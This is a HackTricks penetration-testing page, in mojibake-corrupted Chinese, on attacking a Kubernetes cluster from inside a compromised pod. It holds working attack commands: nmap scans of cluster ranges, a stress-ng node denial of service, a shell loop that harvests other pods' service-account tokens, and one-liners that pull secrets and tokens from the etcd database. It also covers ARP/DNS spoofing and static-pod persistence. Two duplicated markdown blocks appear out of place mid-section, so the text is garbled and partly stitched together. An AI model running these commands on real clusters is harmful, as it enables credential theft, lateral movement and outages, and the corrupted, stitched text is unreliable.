# ä» Pod å†…éƒ¨æ”»å‡» Kubernetes

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹çš„ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## **Pod çªç ´**

**å¦‚æœä½ è¶³å¤Ÿå¹¸è¿ï¼Œä½ å¯èƒ½èƒ½å¤Ÿä»ä¸­é€ƒè„±åˆ°èŠ‚ç‚¹ï¼š**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### ä» pod é€ƒè„±

ä¸ºäº†å°è¯•ä» pod é€ƒè„±ï¼Œä½ å¯èƒ½éœ€è¦é¦–å…ˆ**æå‡æƒé™**ï¼Œä¸€äº›æå‡æƒé™çš„æŠ€æœ¯ï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

ä½ å¯ä»¥æ£€æŸ¥è¿™äº›**docker çªç ´æŠ€æœ¯**æ¥å°è¯•ä»ä½ å·²ç»æ”»ç ´çš„ pod é€ƒè„±ï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### æ»¥ç”¨ Kubernetes æƒé™

å¦‚åœ¨**kubernetes æšä¸¾**éƒ¨åˆ†æ‰€è§£é‡Šçš„ï¼š

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

é€šå¸¸ pod åœ¨å…¶å†…éƒ¨è¿è¡Œæ—¶ä¼šæœ‰ä¸€ä¸ª**æœåŠ¡è´¦æˆ·ä»¤ç‰Œ**ã€‚è¿™ä¸ªæœåŠ¡è´¦æˆ·å¯èƒ½æœ‰ä¸€äº›**é™„åŠ çš„æƒé™**ï¼Œä½ å¯ä»¥**æ»¥ç”¨**è¿™äº›æƒé™æ¥**ç§»åŠ¨**åˆ°å…¶ä»– podï¼Œç”šè‡³**é€ƒè„±**åˆ°é›†ç¾¤å†…é…ç½®çš„èŠ‚ç‚¹ã€‚æŸ¥çœ‹å¦‚ä½•æ“ä½œï¼š

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### æ»¥ç”¨äº‘æƒé™

å¦‚æœ pod åœ¨**äº‘ç¯å¢ƒ**å†…è¿è¡Œï¼Œä½ å¯èƒ½èƒ½å¤Ÿ**æ³„éœ²å…ƒæ•°æ®ç«¯ç‚¹çš„ä»¤ç‰Œ**å¹¶ä½¿ç”¨å®ƒæå‡æƒé™ã€‚

## æœç´¢æ˜“å—æ”»å‡»çš„ç½‘ç»œæœåŠ¡

ç”±äºä½ åœ¨ Kubernetes ç¯å¢ƒå†…ï¼Œå¦‚æœä½ ä¸èƒ½é€šè¿‡æ»¥ç”¨å½“å‰ pod çš„æƒé™æå‡æƒé™ï¼Œä¹Ÿä¸èƒ½ä»å®¹å™¨ä¸­é€ƒè„±ï¼Œä½ åº”è¯¥**æœç´¢æ½œåœ¨çš„æ˜“å—æ”»å‡»çš„æœåŠ¡ã€‚**

### æœåŠ¡

**ä¸ºæ­¤ï¼Œä½ å¯ä»¥å°è¯•è·å– kubernetes ç¯å¢ƒçš„æ‰€æœ‰æœåŠ¡ï¼š**
```
kubectl get svc --all-namespaces
```
é»˜è®¤æƒ…å†µä¸‹ï¼ŒKubernetes ä½¿ç”¨æ‰å¹³ç½‘ç»œæ¶æ„ï¼Œè¿™æ„å‘³ç€**é›†ç¾¤å†…çš„ä»»ä½• pod/æœåŠ¡éƒ½å¯ä»¥ç›¸äº’é€šä¿¡**ã€‚é›†ç¾¤å†…çš„**å‘½åç©ºé—´**é»˜è®¤**æ²¡æœ‰ä»»ä½•ç½‘ç»œå®‰å…¨é™åˆ¶**ã€‚å‘½åç©ºé—´å†…çš„ä»»ä½•äººéƒ½å¯ä»¥ä¸å…¶ä»–å‘½åç©ºé—´é€šä¿¡ã€‚

### æ‰«æ

ä»¥ä¸‹ Bash è„šæœ¬ï¼ˆæ‘˜è‡ª [Kubernetes å·¥ä½œåŠ](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)ï¼‰å°†å®‰è£…å¹¶æ‰«æ kubernetes é›†ç¾¤çš„ IP èŒƒå›´ï¼š
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ï¼Œäº†è§£å¦‚ä½•**æ”»å‡» Kubernetes ç‰¹å®šæœåŠ¡**ä»¥**å±å®³å…¶ä»– pod/æ•´ä¸ªç¯å¢ƒ**ï¼š

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### å—…æ¢

å¦‚æœ**å—æŸçš„ pod è¿è¡Œç€ä¸€äº›æ•æ„ŸæœåŠ¡**ï¼Œå…¶ä»– pod éœ€è¦è®¤è¯ï¼Œä½ å¯èƒ½èƒ½å¤Ÿé€šè¿‡**å—…æ¢æœ¬åœ°é€šä¿¡**è·å–ä»å…¶ä»– pod å‘é€çš„å‡­æ®ã€‚

## ç½‘ç»œæ¬ºéª—

é»˜è®¤æƒ…å†µä¸‹ï¼Œåƒ**ARP æ¬ºéª—**ï¼ˆå› æ­¤ä¹ŸåŒ…æ‹¬**DNS æ¬ºéª—**ï¼‰è¿™æ ·çš„æŠ€æœ¯åœ¨ Kubernetes ç½‘ç»œä¸­æ˜¯æœ‰æ•ˆçš„ã€‚å› æ­¤ï¼Œåœ¨ pod å†…éƒ¨ï¼Œå¦‚æœä½ æ‹¥æœ‰**NET_RAW èƒ½åŠ›**ï¼ˆé»˜è®¤æƒ…å†µä¸‹å°±æœ‰ï¼‰ï¼Œä½ å°†èƒ½å¤Ÿå‘é€å®šåˆ¶çš„ç½‘ç»œæ•°æ®åŒ…ï¼Œå¹¶é€šè¿‡**ARP æ¬ºéª—å¯¹åŒä¸€èŠ‚ç‚¹ä¸Šè¿è¡Œçš„æ‰€æœ‰ pod è¿›è¡Œ MitM æ”»å‡»ã€‚**\
æ­¤å¤–ï¼Œå¦‚æœ**æ¶æ„ pod**è¿è¡Œåœ¨**ä¸ DNS æœåŠ¡å™¨ç›¸åŒçš„èŠ‚ç‚¹ä¸Š**ï¼Œä½ å°†èƒ½å¤Ÿå¯¹**é›†ç¾¤ä¸­æ‰€æœ‰ pod è¿›è¡Œ DNS æ¬ºéª—æ”»å‡»**ã€‚

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## èŠ‚ç‚¹ DoS

åœ¨ Kubernetes æ¸…å•ä¸­æ²¡æœ‰æŒ‡å®šèµ„æºï¼Œä¹Ÿ**æ²¡æœ‰åº”ç”¨**å®¹å™¨çš„é™åˆ¶èŒƒå›´ã€‚ä½œä¸ºæ”»å‡»è€…ï¼Œæˆ‘ä»¬å¯ä»¥**æ¶ˆè€— pod/éƒ¨ç½²è¿è¡Œçš„æ‰€æœ‰èµ„æº**ï¼Œè€—å°½å…¶ä»–èµ„æºï¼Œå¯¼è‡´ç¯å¢ƒ DoSã€‚

è¿™å¯ä»¥ä½¿ç”¨å¦‚ [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng) è¿™æ ·çš„å·¥å…·æ¥å®Œæˆï¼š
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
æ‚¨å¯ä»¥çœ‹åˆ°è¿è¡Œ`stress-ng`æœŸé—´å’Œä¹‹åçš„åŒºåˆ«
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## èŠ‚ç‚¹åæœŸåˆ©ç”¨

å¦‚æœä½ æˆåŠŸ**é€ƒç¦»äº†å®¹å™¨**ï¼Œä½ ä¼šåœ¨èŠ‚ç‚¹ä¸­å‘ç°ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿ï¼š

* **å®¹å™¨è¿è¡Œæ—¶**è¿›ç¨‹ï¼ˆDockerï¼‰
* æ›´å¤šåœ¨èŠ‚ç‚¹ä¸Šè¿è¡Œçš„**pods/containers**ï¼Œä½ å¯ä»¥åƒè¿™æ ·æ»¥ç”¨å®ƒä»¬ï¼ˆæ›´å¤šä»¤ç‰Œï¼‰
* å®Œæ•´çš„**æ–‡ä»¶ç³»ç»Ÿ**å’Œ**æ“ä½œç³»ç»Ÿ**é€šå¸¸
* æ­£åœ¨ç›‘å¬çš„**Kube-Proxy**æœåŠ¡
* æ­£åœ¨ç›‘å¬çš„**Kubelet**æœåŠ¡ã€‚æ£€æŸ¥é…ç½®æ–‡ä»¶ï¼š
* ç›®å½•ï¼š`/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* å…¶ä»–**kuberneteså¸¸è§æ–‡ä»¶**ï¼š
* `$HOME/.kube/config` - **ç”¨æˆ·é…ç½®**
* `/etc/kubernetes/kubelet.conf`- **å¸¸è§„é…ç½®**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **å¼•å¯¼é…ç½®**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcdé…ç½®**
* `/etc/kubernetes/pki` - **Kuberneteså¯†é’¥**

### æŸ¥æ‰¾èŠ‚ç‚¹kubeconfig

å¦‚æœä½ åœ¨ä¹‹å‰è¯„è®ºçš„è·¯å¾„ä¸­æ‰¾ä¸åˆ°kubeconfigæ–‡ä»¶ï¼Œ**æ£€æŸ¥kubeletè¿›ç¨‹çš„`--kubeconfig`å‚æ•°**ï¼š
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### çªƒå–æœºå¯†
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
è„šæœ¬ [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) å°†è‡ªåŠ¨**è·å–å…¶ä»– pod çš„ä»¤ç‰Œå¹¶æ£€æŸ¥å®ƒä»¬æ˜¯å¦å…·æœ‰æ‚¨æ­£åœ¨å¯»æ‰¾çš„æƒé™**ï¼ˆè€Œä¸æ˜¯æ‚¨ä¸€ä¸ªæ¥ä¸€ä¸ªåœ°æŸ¥æ‰¾ï¼‰ï¼š
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### ç‰¹æƒ DaemonSets

DaemonSet æ˜¯ä¸€ä¸ªå°†åœ¨**é›†ç¾¤çš„æ‰€æœ‰èŠ‚ç‚¹ä¸Šè¿è¡Œ**çš„**pod**ã€‚å› æ­¤ï¼Œå¦‚æœ DaemonSet é…ç½®äº†ä¸€ä¸ª**ç‰¹æƒæœåŠ¡è´¦æˆ·**ï¼Œåœ¨**æ‰€æœ‰èŠ‚ç‚¹**ä¸­ï¼Œä½ éƒ½å¯ä»¥æ‰¾åˆ°é‚£ä¸ª**ç‰¹æƒæœåŠ¡è´¦æˆ·**çš„**ä»¤ç‰Œ**ï¼Œä½ å¯ä»¥æ»¥ç”¨å®ƒã€‚

åˆ©ç”¨æ–¹æ³•ä¸ä¸Šä¸€èŠ‚ç›¸åŒï¼Œä½†ç°åœ¨ä½ ä¸å†ä¾èµ–è¿æ°”ã€‚

### è½¬å‘äº‘

å¦‚æœé›†ç¾¤ç”±äº‘æœåŠ¡ç®¡ç†ï¼Œé€šå¸¸**èŠ‚ç‚¹å°†æ‹¥æœ‰ä¸ Pod ä¸åŒçš„è®¿é—®å…ƒæ•°æ®**ç«¯ç‚¹çš„æƒé™ã€‚å› æ­¤ï¼Œå°è¯•**ä»èŠ‚ç‚¹è®¿é—®å…ƒæ•°æ®ç«¯ç‚¹**ï¼ˆæˆ–è€…ä»è®¾ç½®äº† hostNetwork ä¸º True çš„ pod è®¿é—®ï¼‰ï¼š

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### çªƒå– etcd

å¦‚æœä½ å¯ä»¥æŒ‡å®šå°†è¿è¡Œå®¹å™¨çš„ Node çš„ [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)ï¼Œè¿›å…¥æ§åˆ¶å¹³é¢èŠ‚ç‚¹çš„ shell å¹¶è·å–**etcd æ•°æ®åº“**ï¼š
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane èŠ‚ç‚¹å…·æœ‰ **role master**ï¼Œåœ¨ **cloud managed clusters ä¸­ä½ å°†æ— æ³•åœ¨å®ƒä»¬ä¸Šè¿è¡Œä»»ä½•ä¸œè¥¿**ã€‚

#### ä» etcd è¯»å– secrets

å¦‚æœä½ èƒ½å¤Ÿä½¿ç”¨ pod è§„èŒƒä¸­çš„ `nodeName` é€‰æ‹©å™¨åœ¨ control-plane èŠ‚ç‚¹ä¸Šè¿è¡Œä½ çš„ podï¼Œä½ å¯èƒ½ä¼šå¾ˆå®¹æ˜“åœ°è®¿é—® `etcd` æ•°æ®åº“ï¼Œè¯¥æ•°æ®åº“åŒ…å«äº†é›†ç¾¤çš„æ‰€æœ‰é…ç½®ï¼ŒåŒ…æ‹¬æ‰€æœ‰ secretsã€‚

ä»¥ä¸‹æ˜¯ä¸€ä¸ªå¿«é€Ÿä¸”ç®€é™‹çš„æ–¹æ³•ï¼Œå¦‚æœ `etcd` æ­£åœ¨ä½ æ‰€åœ¨çš„ control-plane èŠ‚ç‚¹ä¸Šè¿è¡Œï¼Œå¯ä»¥ä»ä¸­æŠ“å– secretsã€‚å¦‚æœä½ æƒ³è¦ä¸€ä¸ªæ›´ä¼˜é›…çš„è§£å†³æ–¹æ¡ˆï¼Œè¯¥æ–¹æ¡ˆä¼šå¯åŠ¨ä¸€ä¸ªå¸¦æœ‰ `etcd` å®¢æˆ·ç«¯å·¥å…· `etcdctl` çš„ podï¼Œå¹¶ä½¿ç”¨ control-plane èŠ‚ç‚¹çš„å‡­è¯è¿æ¥åˆ° etcdï¼Œæ— è®ºå®ƒåœ¨å“ªé‡Œè¿è¡Œï¼Œè¯·æŸ¥çœ‹ @mauilion æä¾›çš„[è¿™ä¸ªç¤ºä¾‹æ¸…å•](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)ã€‚

**æ£€æŸ¥ `etcd` æ˜¯å¦åœ¨ control-plane èŠ‚ç‚¹ä¸Šè¿è¡Œï¼Œå¹¶æŸ¥çœ‹æ•°æ®åº“çš„ä½ç½®ï¼ˆè¿™æ˜¯åœ¨ `kubeadm` åˆ›å»ºçš„é›†ç¾¤ä¸Šï¼‰**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
# ä» Pod å†…éƒ¨æ”»å‡» Kubernetes

åœ¨ Kubernetes ç¯å¢ƒä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šå°è¯•ä»ä¸€ä¸ªå·²ç»å—æ§çš„ Pod å†…éƒ¨è¿›ä¸€æ­¥æ”»å‡» Kubernetes é›†ç¾¤ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æ”»å‡»æ‰‹æ®µï¼š

## è·å–æœåŠ¡è´¦æˆ·ä»¤ç‰Œ

æ¯ä¸ª Pod éƒ½ä¼šè‡ªåŠ¨æŒ‚è½½ä¸€ä¸ªæœåŠ¡è´¦æˆ·ä»¤ç‰Œã€‚è¿™ä¸ªä»¤ç‰Œå¯ä»¥ç”¨æ¥ä¸ Kubernetes API æœåŠ¡å™¨é€šä¿¡ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤è·å–è¿™ä¸ªä»¤ç‰Œï¼š

```
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## åˆ—å‡ºç¯å¢ƒå˜é‡

Pod ä¸­å¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚æ•°æ®åº“å¯†ç æˆ–å…¶ä»–æœåŠ¡çš„å‡­è¯ã€‚è¿™äº›ä¿¡æ¯å¯èƒ½ä¼šä»¥ç¯å¢ƒå˜é‡çš„å½¢å¼å­˜åœ¨ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ—å‡ºç¯å¢ƒå˜é‡ï¼š

```
env
```

## è®¿é—® Kubernetes API

ä½¿ç”¨æœåŠ¡è´¦æˆ·ä»¤ç‰Œï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•è®¿é—® Kubernetes API æ¥å‘ç°æ›´å¤šä¿¡æ¯ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨ `curl` è®¿é—® API çš„ä¾‹å­ï¼š

```
curl -k https://kubernetes.default.svc.cluster.local/api --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

## åˆ©ç”¨ RBAC é…ç½®ä¸å½“

å¦‚æœ Role-Based Access Control (RBAC) é…ç½®ä¸å½“ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šè·å¾—æ¯”ä»–ä»¬åº”æœ‰æƒé™æ›´å¤šçš„è®¿é—®æƒã€‚æ£€æŸ¥å½“å‰æƒé™å¯ä»¥ä½¿ç”¨ `kubectl` å‘½ä»¤ï¼š

```
kubectl auth can-i --list
```

## å¯»æ‰¾æœªåŠ å¯†çš„æ•æ„Ÿæ•°æ®

åœ¨ Kubernetes ä¸­ï¼ŒSecrets åº”è¯¥ç”¨æ¥å­˜å‚¨æ•æ„Ÿæ•°æ®ï¼Œå¦‚å¯†ç å’Œ API å¯†é’¥ã€‚ç„¶è€Œï¼Œå¦‚æœ Secrets æ²¡æœ‰å¾—åˆ°é€‚å½“çš„åŠ å¯†ï¼Œå®ƒä»¬å¯èƒ½ä¼šè¢«æ³„éœ²ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ—å‡ºæ‰€æœ‰ Secretsï¼š

```
kubectl get secrets --all-namespaces
```

## åˆ©ç”¨å·²çŸ¥æ¼æ´

Kubernetes å’Œè¿è¡Œåœ¨å…¶ä¸Šçš„åº”ç”¨ç¨‹åºå¯èƒ½ä¼šæœ‰å·²çŸ¥çš„æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´æ¥æå‡æƒé™æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚å®šæœŸæ£€æŸ¥å’Œæ›´æ–°è½¯ä»¶å¯ä»¥å¸®åŠ©å‡å°‘è¿™ç§é£é™©ã€‚

é€šè¿‡è¿™äº›æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ Kubernetes ç¯å¢ƒä¸­è¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œå¯»æ‰¾è¿›ä¸€æ­¥æ”»å‡»çš„æœºä¼šã€‚
```
```bash
data-dir=/var/lib/etcd
```
**æŸ¥çœ‹ etcd æ•°æ®åº“ä¸­çš„æ•°æ®ï¼š**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**ä»æ•°æ®åº“ä¸­æå–ä»¤ç‰Œå¹¶æ˜¾ç¤ºæœåŠ¡è´¦æˆ·åç§°**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**ç›¸åŒçš„å‘½ä»¤ï¼Œä½†å¢åŠ äº†ä¸€äº› grepï¼Œä»…è¿”å› kube-system å‘½åç©ºé—´ä¸­çš„é»˜è®¤ä»¤ç‰Œ**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
# ä» Pod å†…éƒ¨æ”»å‡» Kubernetes

åœ¨ Kubernetes ç¯å¢ƒä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šå°è¯•ä»ä¸€ä¸ªå·²ç»å—æ§çš„ Pod å†…éƒ¨è¿›ä¸€æ­¥æ”»å‡» Kubernetes é›†ç¾¤ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æ”»å‡»æ‰‹æ®µï¼š

## è·å–æœåŠ¡è´¦æˆ·ä»¤ç‰Œ

æ¯ä¸ª Pod éƒ½ä¼šè‡ªåŠ¨æŒ‚è½½ä¸€ä¸ªæœåŠ¡è´¦æˆ·ä»¤ç‰Œã€‚è¿™ä¸ªä»¤ç‰Œå¯ä»¥ç”¨æ¥ä¸ Kubernetes API æœåŠ¡å™¨é€šä¿¡ã€‚è¦è·å–è¿™ä¸ªä»¤ç‰Œï¼Œä½ å¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

## åˆ—å‡ºç¯å¢ƒå˜é‡

Pod ä¸­å¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚æ•°æ®åº“å¯†ç æˆ–å…¶ä»–æœåŠ¡çš„å‡­è¯ã€‚è¦åˆ—å‡ºæ‰€æœ‰ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```bash
env
```

## è®¿é—® Kubernetes API

ä½¿ç”¨æœåŠ¡è´¦æˆ·ä»¤ç‰Œï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•è®¿é—® Kubernetes API æ¥è·å–é›†ç¾¤ä¿¡æ¯ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹å‘½ä»¤ï¼š

```bash
curl https://kubernetes.default.svc.cluster.local/api --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

## åˆ©ç”¨ RBAC é…ç½®ä¸å½“

å¦‚æœé›†ç¾¤çš„ RBACï¼ˆRole-Based Access Controlï¼‰é…ç½®ä¸å½“ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šè·å¾—æ¯”é¢„æœŸæ›´å¤šçš„æƒé™ã€‚è¿™å¯èƒ½å¯¼è‡´å¯¹é›†ç¾¤èµ„æºçš„æœªæˆæƒè®¿é—®ã€‚

## åˆ©ç”¨ etcd æ³„éœ²

etcd æ˜¯ Kubernetes çš„é”®å€¼å­˜å‚¨ï¼Œç”¨äºä¿å­˜æ‰€æœ‰é›†ç¾¤æ•°æ®ã€‚å¦‚æœ etcd æœªæ­£ç¡®é…ç½®å’Œä¿æŠ¤ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šè®¿é—®æ•æ„Ÿæ•°æ®ã€‚

## åˆ©ç”¨æœªåŠ å›ºçš„èŠ‚ç‚¹

å¦‚æœ Kubernetes èŠ‚ç‚¹æœªç»è¿‡é€‚å½“åŠ å›ºï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨èŠ‚ç‚¹ä¸Šçš„æ¼æ´æ¥æå‡æƒé™æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ã€‚

é€šè¿‡äº†è§£å’Œåˆ©ç”¨è¿™äº›æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ Kubernetes ç¯å¢ƒä¸­è¿›è¡Œæ›´æ·±å…¥çš„æ¸—é€æµ‹è¯•ã€‚
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### é™æ€/é•œåƒ Pods æŒä¹…æ€§

_é™æ€ Pods_ æ˜¯ç”±ç‰¹å®šèŠ‚ç‚¹ä¸Šçš„ kubelet å®ˆæŠ¤è¿›ç¨‹ç›´æ¥ç®¡ç†çš„ï¼ŒAPI æœåŠ¡å™¨å¹¶ä¸ç›‘è§†å®ƒä»¬ã€‚ä¸ç”±æ§åˆ¶å¹³é¢ç®¡ç†çš„ Podsï¼ˆä¾‹å¦‚ï¼ŒDeploymentï¼‰ä¸åŒï¼›ç›¸åï¼Œ**kubelet ä¼šç›‘è§†æ¯ä¸ªé™æ€ Pod**ï¼ˆå¦‚æœå®ƒå¤±è´¥äº†ä¼šé‡å¯å®ƒï¼‰ã€‚

å› æ­¤ï¼Œé™æ€ Pods æ€»æ˜¯**ç»‘å®šåˆ°ç‰¹å®šèŠ‚ç‚¹ä¸Šçš„ä¸€ä¸ª Kubelet**ã€‚

**kubelet ä¼šè‡ªåŠ¨å°è¯•åœ¨ Kubernetes API æœåŠ¡å™¨ä¸Šä¸ºæ¯ä¸ªé™æ€ Pod åˆ›å»ºä¸€ä¸ªé•œåƒ Pod**ã€‚è¿™æ„å‘³ç€åœ¨èŠ‚ç‚¹ä¸Šè¿è¡Œçš„ Pods åœ¨ API æœåŠ¡å™¨ä¸Šæ˜¯å¯è§çš„ï¼Œä½†ä¸èƒ½ä»é‚£é‡Œæ§åˆ¶ã€‚Pod åç§°å°†ä»¥èŠ‚ç‚¹ä¸»æœºåä¸ºåç¼€ï¼Œå‰é¢å¸¦æœ‰è¿å­—ç¬¦ã€‚

{% hint style="danger" %}
é™æ€ Pod çš„ **`spec` ä¸èƒ½å¼•ç”¨å…¶ä»– API å¯¹è±¡**ï¼ˆä¾‹å¦‚ï¼ŒServiceAccount, ConfigMap, Secret ç­‰ï¼‰ã€‚æ‰€ä»¥**ä½ ä¸èƒ½æ»¥ç”¨è¿™ç§è¡Œä¸ºåœ¨å½“å‰èŠ‚ç‚¹å¯åŠ¨ä¸€ä¸ªå¸¦æœ‰ä»»æ„ serviceAccount çš„ pod** æ¥å¦¥åé›†ç¾¤ã€‚ä½†ä½ å¯ä»¥ä½¿ç”¨å®ƒåœ¨ä¸åŒçš„å‘½åç©ºé—´è¿è¡Œ podsï¼ˆå¦‚æœå‡ºäºæŸç§åŸå› è¿™æœ‰ç”¨çš„è¯ï¼‰ã€‚
{% endhint %}

